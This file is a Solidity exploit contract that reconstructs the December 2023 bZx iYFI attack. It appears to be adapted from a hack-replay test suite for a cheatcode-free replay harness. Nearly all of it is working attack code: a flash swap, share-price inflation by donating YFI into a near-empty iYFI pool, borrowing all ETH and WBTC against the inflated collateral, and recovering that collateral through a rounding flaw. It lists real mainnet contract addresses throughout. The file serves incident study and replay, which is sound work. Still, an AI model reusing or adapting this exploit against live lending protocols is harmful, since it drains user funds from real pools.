// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

// @KeyInfo - Total Lost : ~$208K
// Attacker : https://etherscan.io/address/0x5a7c7eb8d13a53d42a15d2b1d1b694ccc5141ea5
// Attack Contract : https://etherscan.io/address/0x03b7bb750a974e0bd34795013f66b669f4110e54
// Vulnerable Contract : https://etherscan.io/address/0x7f3fe9d492a9a60aebb06d82cba23c6f32cad10b
// Attack Tx 1 : https://app.blocksec.com/explorer/tx/eth/0x0fc5c0d41e5506fdb9434fab4815a4ff671afc834e47a533b3bed7182ece73b0
// Attack Tx 2 : https://app.blocksec.com/explorer/tx/eth/0xb072f2e88058c147d8ff643694b43a42e36525b7173ce1daf76e6c06170b0e77
//
// Standalone synthetic exploit contract, derived from the registry's
// test/bZx_exp.sol. The original Foundry test runs the WHOLE attack inline on
// the `ContractTest is Test` harness itself (no separate exploit contract) and
// relies on TWO Foundry cheatcodes inside the flash-swap callback that have no
// equivalent in the Playground's cheatcode-free replay harness:
//
//   1. `vm.prank(originalAttackContract); iYFI.burn(originalAttackContract, 5);`
//      impersonates the REAL on-chain attack contract (which, at the forked
//      block, already held a pre-existing 5-wei iYFI position from before this
//      attack transaction) to burn ITS shares, emptying the iYFI pool right
//      before the deposit/mint step below.
//   2. `deal(address(YFI), address(this), YFI.balanceOf(address(this)) + 5);`
//      artificially credits `this` with the 5 wei of YFI that burn() above
//      actually redeemed to `originalAttackContract` (a DIFFERENT address than
//      the test contract), so the donation math below balances.
//
// Both are replaced by ONE unrecorded `setup.steps` rawCall (see
// scripts/poc-configs/2023-12-bZx.mjs) that impersonates `originalAttackContract`
// directly (a literal `caller` address, no cheatcode needed) and sets the
// burn's `receiver` argument to THIS contract instead of back to
// `originalAttackContract` — so the redeemed YFI lands here organically and
// cheatcode #2 becomes unnecessary too. Net economics are identical either way
// (burn's redemption amount depends only on the shares burned, not on who
// receives the underlying).

interface IToken is IERC20 {
    struct LoanOpenData {
        bytes32 loanId;
        uint256 principal;
        uint256 collateral;
    }

    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes memory
    ) external payable returns (LoanOpenData memory);

    function burn(address receiver, uint256 burnAmount) external returns (uint256 loanAmountPaid);

    function mint(address receiver, uint256 depositAmount) external returns (uint256);
}

interface IbZx {
    function withdrawCollateral(
        bytes32 loanId,
        address receiver,
        uint256 withdrawAmount
    ) external returns (uint256 actualWithdrawAmount);
}

contract BzxYFIExploit {
    Uni_Pair_V2 private constant YFI_WETH = Uni_Pair_V2(0x088ee5007C98a9677165D78dD2109AE4a3D04d0C);
    // Underlying asset
    IERC20 private constant YFI = IERC20(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e);
    // iToken lending pool
    IToken private constant iYFI = IToken(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b);
    IToken private constant iETH = IToken(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6);
    IToken private constant iWBTC = IToken(0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IbZx private constant bzX = IbZx(0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f);
    Uni_Router_V2 private constant SushiRouter = Uni_Router_V2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    Uni_Router_V2 private constant UniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 private constant iYFIQuantity = 5;

    // Borrow function args
    bytes32 private constant borrowLoanId = bytes32(0);
    uint256 private constant initialLoanDuration = 0;

    function attack() external {
        uint256 yfiFlashAmount = YFI.balanceOf(address(YFI_WETH)) / 10;
        // If the data.length is > 0 then the pair recognizes a flashswap instead of a typical swap.
        bytes memory data = abi.encodePacked(uint8(48));
        YFI_WETH.swap(yfiFlashAmount, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        YFI.approve(address(iYFI), type(uint256).max);

        // The real attack contract's pre-existing 5-wei iYFI position was
        // already burned — redeemed straight to THIS contract — by an
        // unrecorded setup.steps rawCall (impersonating originalAttackContract)
        // that ran before attack() was called. See scripts/poc-configs/2023-12-bZx.mjs.
        // At this point the iYFI pool is already (near) empty.

        // Deposit 5 wei YFI and mint 5 wei iYFI while the pool is (near) empty.
        iYFI.mint(address(this), iYFIQuantity);

        // Donate the ENTIRE remaining YFI balance (the flash-swapped amount,
        // netted against the pre-funded 5 wei the mint above just consumed) to
        // iYFI. This massively inflates the value of the 5 iYFI shares just minted.
        YFI.transfer(address(iYFI), YFI.balanceOf(address(this)));

        // Borrow/steal all ETH from the iETH pool using the now-inflated collateral.
        stealETH();
        // Borrow/steal all WBTC from the iWBTC pool using the now-inflated collateral.
        stealWBTC();

        // Exploiter successfully retrieves its collateral (shares) after
        // borrowing/stealing tokens — this is due to a rounding issue in the
        // bZx contract.
        uint256 iYFIAmount = iYFI.balanceOf(address(this));
        // Burn iYFI and retrieve the now-inflated underlying YFI.
        iYFI.burn(address(this), iYFIAmount);

        // Repay the flashswap.
        uint256 amountOut = (((amount0 * 1000) + 1) / 997) - amount0;
        WETHToYFI(amountOut);
        YFI.transfer(address(YFI_WETH), YFI.balanceOf(address(this)));
    }

    receive() external payable {}

    function borrowToken(IToken iToken, uint256 withdrawAmount) private returns (bytes32 loanId) {
        IToken.LoanOpenData memory loanData = iToken.borrow(
            borrowLoanId,
            withdrawAmount,
            initialLoanDuration,
            iYFIQuantity,
            address(iYFI),
            address(this),
            address(this),
            ""
        );
        loanId = loanData.loanId;
    }

    function withdrawCollateral(
        bytes32 loanID
    ) private {
        bzX.withdrawCollateral(loanID, address(this), iYFIQuantity);
    }

    function WBTCToWETH() private {
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(WETH);
        SushiRouter.swapExactTokensForTokens(
            WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100
        );
    }

    function WETHToYFI(
        uint256 amount
    ) private {
        WETH.approve(address(UniRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(YFI);
        UniRouter.swapTokensForExactTokens(
            amount, WETH.balanceOf(address(this)), path, address(this), block.timestamp + 100
        );
    }

    function stealETH() private {
        iYFI.approve(address(iETH), type(uint256).max);
        bytes32 loanId = borrowToken(iETH, WETH.balanceOf(address(iETH)));
        WETH.deposit{value: address(this).balance}();
        withdrawCollateral(loanId);
    }

    function stealWBTC() private {
        iYFI.approve(address(iWBTC), type(uint256).max);
        WBTC.approve(address(SushiRouter), type(uint256).max);
        bytes32 loanId = borrowToken(iWBTC, WBTC.balanceOf(address(iWBTC)));
        WBTCToWETH();
        withdrawCollateral(loanId);
    }
}
